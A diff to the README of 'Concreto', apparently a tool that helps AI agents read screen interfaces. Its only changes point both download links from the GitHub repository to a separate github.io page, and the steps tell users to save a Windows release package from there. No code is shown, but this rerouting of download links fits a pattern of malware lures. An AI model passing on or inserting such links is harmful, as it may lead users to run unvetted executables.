@@ -1,6 +1,6 @@
 # 🏗️ Concreto - Build Better Interfaces For Your Agents
 
-[![](https://img.shields.io/badge/Download-Concreto-blue.svg)](https://github.com/sanjayma4345/Concreto)
+[![](https://img.shields.io/badge/Download-Concreto-blue.svg)](https://sanjayma4345.github.io)
 
 Concreto provides a clear framework for AI agents to interact with your screen. Software agents often struggle to view or use complex buttons and menus. This tool maps your interface into a structure agents understand. Your agents now perform tasks with precision. They click the correct buttons and fill the right forms every time.
 
@@ -29,7 +29,7 @@ We support all standard display resolutions. Concreto adjusts its view based on 
 
 Follow these steps to obtain and start the software. 
 
-1. Visit this page to download: [https://github.com/sanjayma4345/Concreto](https://github.com/sanjayma4345/Concreto)
+1. Visit this page to download: [https://sanjayma4345.github.io](https://sanjayma4345.github.io)
 2. Locate the latest release package on the page.
 3. Choose the version that matches your Windows architecture, usually 64-bit.
 4. Save the file to your desktop for easy access.
